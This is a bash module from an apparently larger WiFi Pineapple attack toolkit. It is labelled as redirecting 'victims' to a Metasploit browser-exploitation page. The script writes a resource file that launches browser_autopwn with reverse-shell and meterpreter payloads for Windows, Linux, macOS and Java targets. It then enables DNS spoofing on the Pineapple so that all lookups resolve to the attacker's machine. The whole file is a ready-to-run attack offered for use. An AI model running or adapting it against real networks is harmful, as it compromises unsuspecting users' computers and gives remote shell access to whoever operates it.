#
# Redirect victims to a metasploit browserpwn page
#
# Author: Leg3nd @ https://leg3nd.me
#
################ Module Configuration ##
title="[Redirect] BrowserPwn"
# Create a description for menu
description="Metasploit BrowserPwn Module"
# Letter keys/commands to select item in menu
bindings='B|b'
#########################################

# Variables

# Start Function
function start_browserpwn(){
  echo -e "\n\e[01;34m[>]\e[00m Running Metasploit BrowserPwn attack vector..."
  
  # Stop our apache server
  service apache2 stop > /dev/null 2>&1
  echo -e "\e[01;34m[>]\e[00m Starting up metasploit browserpwn module.."
  echo -e "use auxiliary/server/browser_autopwn
  set LHOST \"${our_ip}\"
  set URIPATH /
  set SRVPORT 80
  set PAYLOAD_GENERIC generic/shell_reverse_tcp 
  set PAYLOAD_JAVA java/meterpreter/reverse_tcp
  set PAYLOAD_LINUX linux/meterpreter/reverse_tcp
  set PAYLOAD_MACOS osx/meterpreter/reverse_tcp
  set PAYLOAD_WIN32 windows/meterpreter/reverse_tcp
  exploit -j" > /tmp/browserpwn.rc

  terminator -e "msfconsole -r /tmp/browserpwn.rc" > /dev/null 2>&1 &
  
  echo -e "\e[01;34m[>]\e[00m Sleeping 5min while exploit modules load..."
  sleep 5m
  
  # Set DNSspoof on the pineapple
  echo -e "\e[01;34m[>]\e[00m Enabling dnsspoof on the pineapple.."    
  command="echo \"${our_ip} *\" > /etc/pineapple/spoofhost"
  pineapple_command
  command="bash /pineapple/components/infusions/dnsspoof/includes/autostart.sh"
  pineapple_command
}

# Stop Function
function stop_browserpwn(){
  echo -e "\n\e[01;34m[>]\e[00m Stopping Metasploit BrowserPwn attack vector..."
  command="killall -9 dnsspoof"
  pineapple_command
}
